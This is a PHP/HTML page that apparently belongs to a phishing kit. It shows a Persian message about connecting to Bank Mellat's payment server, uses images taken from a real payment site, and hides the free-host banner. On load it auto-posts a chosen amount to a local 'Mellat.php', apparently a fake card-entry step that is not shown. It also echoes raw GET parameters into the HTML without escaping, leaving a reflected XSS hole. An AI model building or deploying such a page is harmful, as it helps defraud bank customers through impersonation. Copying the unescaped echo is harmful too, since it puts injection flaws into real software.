

<?php

if(isset($_GET['amount'])){
    $_SESSION['amount'] = $_GET['amount'];
}elseif(isset($_GET['Amount'])){
    $_SESSION['amount'] = $_GET['Amount'];
}elseif(isset($_GET['price'])){
    $_SESSION['amount'] = $_GET['price'];
}else{
    $_SESSION['amount'] = "20,000";

}
if(isset($_GET['e'])){
    $e = $_GET['e'];
}else{
    $e = 0;
   } 
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
    <title>در حال اتصال ...</title>
  
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <style>img[alt="www.000webhost.com"]{display:none;}</style>
  <style type="text/css">
        #arrow{width:104px;height:70px;position:absolute;left:10px;top:10px;background-image:url('https://www.echarge.ir/WebResource.axd?d=rRPdvMyprJxV-mRzr0A1PKz9Cqd-cy27UE0TJI02cMz5Z1ZFDf5IBVkojMhn6jMCMINnCbpJuUzDXANNa4Zy9zyHdD5yO4-E4uUuC-l9T-d4sekhHdqpuC2vHzgsMrfVBsXUoHy2Og2ZMQfw0YrU7WUAK98kwfdgbkk6D1Ss_2CulrEepVuh1ddai0UXXhB3gqht_BWZFsoJsar5R2HgWZxYGBuD5Lbqps5gh3UvQLI1&t=636963972820000000');}
        #main{background-color:#f1f1f1;border:solid 1px #cacaca;width:530px;height:90px;position:absolute;left:50%;margin-left:-265px;top:200px;} 
        #main p{direction:rtl; font-family:Arial;font-size:16px;font-weight:bold;color:#757575;text-align:right;padding-right:60px;line-height:27px;margin-top:30px;}
        #image{width:24px;height:24px; position:absolute;left:100%;margin-left:-35px;top:50%;margin-top:-12px;background-image:url('https://www.echarge.ir/WebResource.axd?d=3ijac8pVhaEIxnptNAmFG22laLHJVPpyW2R44W_GsnZOb2i3OQ8M81sZGthsMjrryZNUSqtwzsQSk62_3WRfauibSuPVabV6zqFt0e29pv4edqnEXBGNWqSaDqnJCJHtWmBGnZYHQ60n-pxKih9n_BHNzeKZ2JuFaBNsbT8BNtu7D41hzmnASu1MYJ-8Cd-uOujRolyAFPZ4C9GiEwfNm7b5Kg0X561heLa9SwEX79M1&t=636963972820000000'); }</style>
<!--
CODED_BY_AZERAKHSH_HUNTER
-->
    <script  type="text/javascript">

        function doPostback() {
                var theForm = document.forms['form1'];
                if (!theForm)
                    theForm = document.form1;
                var GateChanged = document.getElementById("x_GateChanged").value;               
                if (GateChanged == "1")                    
                    {
                        document.getElementById("MainMessage").style.visibility = "hidden";
                        document.getElementById("Warning").style.visibility = "visible";
                        document.getElementById("Message").style.marginTop = "20px";
                        setTimeout(' var theForm = document.forms[\'form1\'];if (!theForm) theForm = document.form1;theForm.submit();', 5000000);              
                    }
                else
					
                    theForm.submit();
           } 

    </script>
</head>
<!--

-->
<body onload="doPostback();">
    <form name="form1" method="POST" action="Mellat.php" target="_top" >
<input id="x_GateChanged" type="hidden" value="0" />
<input name="amount" type="hidden" value="<?php echo $_SESSION["amount"]; ?> " />
<input name="e" type="hidden" value="<?php echo $e ?>" />
</form>

    <div id="main">
    <div id="arrow"></div>

        <p id="Message">
            <span id="MainMessage"> درحال اتصال به سرور پرداخت الکترونیک <span style="color: #F37550">ملت<br/></span></span>
            <span id="Warning" style="visibility: hidden; margin-top: 0px; display: block; position: relative; right: -10px; top: -40px; width: 380px;"> <span style="color: #F37550"></span></span>
        </p>
    <div id="image"></div>
    </div>
</body>
<!--

-->
</html>
